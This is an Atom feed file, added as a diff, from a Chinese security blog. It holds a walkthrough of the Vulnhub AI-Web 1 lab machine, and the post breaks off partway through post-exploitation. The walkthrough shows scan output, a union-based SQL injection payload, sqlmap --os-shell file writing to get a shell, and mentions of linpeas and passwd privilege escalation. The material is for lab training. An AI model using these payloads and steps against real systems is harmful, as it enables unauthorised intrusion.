@@ -1,0 +1,130 @@
+<?xml version="1.0"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://k1t0111.github.io</id>
+    <title>K1T0 • Posts by &#34;sql注入&#34; tag</title>
+    <link href="https://k1t0111.github.io" />
+    <updated>2024-07-13T03:57:00.000Z</updated>
+    <category term="CTF" />
+    <category term="Android移动开发" />
+    <category term="枚举AD" />
+    <category term="cors" />
+    <category term="渗透靶场" />
+    <category term="渗透工具" />
+    <category term="top10及相关漏洞" />
+    <category term="tryhackme" />
+    <category term="vulnhub" />
+    <category term="sql注入" />
+    <category term="计算机网络" />
+    <category term="ssrf" />
+    <category term="博客搭建" />
+    <category term="攻击" />
+    <category term="hackmyvm" />
+    <category term="JAVA" />
+    <category term="漏洞分析" />
+    <category term="Hackthebox" />
+    <category term="安全设备" />
+    <category term="SQL" />
+    <category term="权限提升" />
+    <category term="信息收集" />
+    <category term="计算机组成原理" />
+    <category term="操作系统" />
+    <category term="信息安全数学基础" />
+    <category term="文件上传" />
+    <category term="横向移动" />
+    <category term="xss" />
+    <category term="算法" />
+    <entry>
+        <id>https://k1t0111.github.io/2024/07/13/Vulnhub-Aiweb1/</id>
+        <title>Vulnhub-Aiweb1</title>
+        <link rel="alternate" href="https://k1t0111.github.io/2024/07/13/Vulnhub-Aiweb1/"/>
+        <content type="html">&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;机器信息&lt;/th&gt;
+&lt;th&gt;vulnhub 靶场 AI-Web 1&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;操作系统&lt;/td&gt;
+&lt;td&gt;linux&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;详细介绍&lt;/td&gt;
+&lt;td&gt;特训结业训练的 一个简单靶场，主要还是 web 的信息泄露和 sql 注入&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;sql 注入碰巧又符合 os-shell 可以拿到 shell 之后就是一个简单的 passwd 提权&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h1 id=&#34;0x00信息收集&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x00信息收集&#34;&gt;#&lt;/a&gt; 0x00 信息收集&lt;/h1&gt;
+&lt;h3 id=&#34;0x01循例端口扫描&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x01循例端口扫描&#34;&gt;#&lt;/a&gt; 0x01 循例端口扫描&lt;/h3&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Starting Nmap &lt;span class=&#34;token number&#34;&gt;7.93&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; at &lt;span class=&#34;token number&#34;&gt;2024&lt;/span&gt;-07-06 &lt;span class=&#34;token number&#34;&gt;11&lt;/span&gt;:24 CST&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Nmap scan report &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;192.168&lt;/span&gt;.49.128&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Host is up &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;.00021s latency&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;.&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Not shown: &lt;span class=&#34;token number&#34;&gt;999&lt;/span&gt; closed tcp ports &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;reset&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;PORT   STATE SERVICE&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;80&lt;/span&gt;/tcp &lt;span class=&#34;token function&#34;&gt;open&lt;/span&gt;  http&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;MAC Address: 00:0C:29:23:04:32 &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;VMware&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 详细信息:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;PORT   STATE SERVICE VERSION&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;80&lt;/span&gt;/tcp &lt;span class=&#34;token function&#34;&gt;open&lt;/span&gt;  http    Apache httpd&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt;_http-title: AI Web &lt;span class=&#34;token number&#34;&gt;1.0&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt;_http-server-header: Apache&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt; http-robots.txt: &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt; disallowed entries &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt;_/m3diNf0/ /se3reTdir777/uploads/&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;MAC Address: 00:0C:29:23:04:32 &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;VMware&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Warning: OSScan results may be unreliable because we could not &lt;span class=&#34;token function&#34;&gt;find&lt;/span&gt; at least &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;open&lt;/span&gt; and &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; closed port&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Device type: general purpose&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Running: Linux &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;.X&lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;.X&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;OS details: Linux &lt;span class=&#34;token number&#34;&gt;3.2&lt;/span&gt; - &lt;span class=&#34;token number&#34;&gt;4.9&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Network Distance: &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; hop&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h5 id=&#34;资产整理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#资产整理&#34;&gt;#&lt;/a&gt; 资产整理&lt;/h5&gt;
+&lt;blockquote&gt;
+&lt;p&gt;系统：Linux&lt;br /&gt;
+ 服务器：Apache (版本未知)&lt;br /&gt;
+ 信息泄露: robots.txt&lt;br /&gt;
+ 路径泄露: /m3diNf0/             /se3reTdir777/uploads/&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;可以看出只有 web 资产&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&#34;0x02扫描目录&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x02扫描目录&#34;&gt;#&lt;/a&gt; 0x02 扫描目录&lt;/h3&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;+ http://192.168.49.128/index.html &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;CODE:200&lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt;SIZE:141&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;               &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;+ http://192.168.49.128/robots.txt &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;CODE:200&lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt;SIZE:82&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;                &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;+ http://192.168.49.128/server-status &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;CODE:403&lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt;SIZE:222&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;11&lt;/span&gt;:48:08&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;403&lt;/span&gt; -  220B  - /.ht_wsr.txt&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;11&lt;/span&gt;:48:09&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;403&lt;/span&gt; -  223B  - /.htaccess.orig&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;11&lt;/span&gt;:48:09&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;403&lt;/span&gt; -  225B  - /.htaccess.sample&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;11&lt;/span&gt;:48:09&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;403&lt;/span&gt; -  223B  - /.htaccess.bak1&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;11&lt;/span&gt;:48:09&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;403&lt;/span&gt; -  223B  - /.htaccess.save&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;11&lt;/span&gt;:48:09&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;403&lt;/span&gt; -  223B  - /.htaccess_orig&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;11&lt;/span&gt;:48:09&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;403&lt;/span&gt; -  221B  - /.htaccess_sc&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;11&lt;/span&gt;:48:09&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;403&lt;/span&gt; -  221B  - /.htaccessBAK&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;11&lt;/span&gt;:48:09&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;403&lt;/span&gt; -  221B  - /.htaccessOLD&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;11&lt;/span&gt;:48:09&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;403&lt;/span&gt; -  222B  - /.htaccessOLD2&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;11&lt;/span&gt;:48:09&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;403&lt;/span&gt; -  213B  - /.htm&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;11&lt;/span&gt;:48:09&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;403&lt;/span&gt; -  214B  - /.html&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;11&lt;/span&gt;:48:09&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;403&lt;/span&gt; -  223B  - /.htpasswd_test&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;11&lt;/span&gt;:48:09&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;403&lt;/span&gt; -  220B  - /.httr-oauth&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;11&lt;/span&gt;:48:09&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;403&lt;/span&gt; -  219B  - /.htpasswds&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;11&lt;/span&gt;:48:10&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;403&lt;/span&gt; -  213B  - /.php&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;11&lt;/span&gt;:48:10&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;403&lt;/span&gt; -  224B  - /.htaccess_extra&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  err&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;11&lt;/span&gt;:49:00&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;200&lt;/span&gt; -   80B  - /robots.txt                                 &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;11&lt;/span&gt;:49:01&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;403&lt;/span&gt; -  222B  - /server-status&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;11&lt;/span&gt;:49:01&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;403&lt;/span&gt; -  223B  - /server-status/&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;blockquote&gt;
+&lt;p&gt;可以看到 robots.txt 除此之外没有什么别的东西了&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;403 了 这个 url 因此&lt;a href=&#34;http://192.168.49.128/m3diNf0/&#34;&gt; http://192.168.49.128/m3diNf0/&lt;/a&gt;&lt;br /&gt;
+ 继续递归扫描目录&lt;/p&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;14&lt;/span&gt;:57:12&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;200&lt;/span&gt; -   22KB - /m3diNf0/info.php&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;一个信息泄露&lt;br /&gt;
+再次挨个扫目录不能说毫无收获 只能说一无所获&lt;/p&gt;
+&lt;h1 id=&#34;0x10-web&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x10-web&#34;&gt;#&lt;/a&gt; 0x10 web&lt;/h1&gt;
+&lt;h4 id=&#34;信息泄露&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#信息泄露&#34;&gt;#&lt;/a&gt; 信息泄露&lt;/h4&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;http://192.168.49.128/m3diNf0/info.php&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;没有猜错OS &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;7.2&lt;/span&gt;.19-0ubuntu0.18.04.2&lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h4 id=&#34;sql注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sql注入&#34;&gt;#&lt;/a&gt; SQL 注入&lt;/h4&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;http://192.168.49.128/se3reTdir777&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;联合查询 注入 而且感觉是一个回显注入&lt;/p&gt;
+&lt;p&gt;**poc&lt;/p&gt;
+&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&#39; &lt;span class=&#34;token keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; version&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://raw.githubusercontent.com/k1t0111/blog/main/image/20240706155145.png&#34; alt=&#34;image.png&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;**First Name: aiweb1user@localhost&lt;br /&gt;
+Last Name: 5.7.42-0ubuntu0.18.04.1&lt;/p&gt;
+&lt;h1 id=&#34;0x20-get_shell&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x20-get_shell&#34;&gt;#&lt;/a&gt; 0x20 Get_shell&lt;/h1&gt;
+&lt;blockquote&gt;
+&lt;p&gt;目前就找到一个 sql 注入 根据 sql 注入做文章  先停止信息收集&lt;br /&gt;
+最快可以 getshell 的只能是 --os-shell&lt;br /&gt;
+secure_file_priv 这个没在 phpinfo () 中查到&lt;br /&gt;
+但是可以知道用户&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;sqlmap 使用&lt;/th&gt;
+&lt;th&gt;&lt;a href=&#34;%E5%B8%B8%E8%A7%84%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/%E6%BC%8F%E6%B4%9E/sqlmap.md#%E9%AB%98%E6%9D%83%E9%99%90&#34;&gt;高权限:&lt;/a&gt;&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;怎么说呢 我现在觉得只能去盲猜测 secure.... 没被设置 但是我们还要找到一个 当前用户有权限的一些路径 才能上传 getshell  试了常规的 /var/www/html  但是不行后来在&lt;br /&gt;
+ info.php 找到了根目录&lt;br /&gt;
+ |/home/www/html/web1x443290o2sdf92213 | 但是也不行 只能试试 uploads&lt;/p&gt;
+&lt;p&gt;|/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/|&lt;/p&gt;
+&lt;p&gt;成功&lt;br /&gt;
+&lt;img loading=&#34;lazy&#34; data-src=&#34;https://raw.githubusercontent.com/k1t0111/blog/main/image/20240706162859.png&#34; alt=&#34;image.png&#34; /&gt;&lt;/p&gt;
+&lt;h1 id=&#34;0x30-post&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x30-post&#34;&gt;#&lt;/a&gt; 0x30 Post&lt;/h1&gt;
+&lt;blockquote&gt;
+&lt;p&gt;第一步肯定是 linpeas 先上去扫一遍&lt;br /&gt;
+怎么说呢.... 好像傻了一样 找了多攻击向量但是都用不成 后来才发现 passwd 是我自己的 文件&lt;br /&gt;
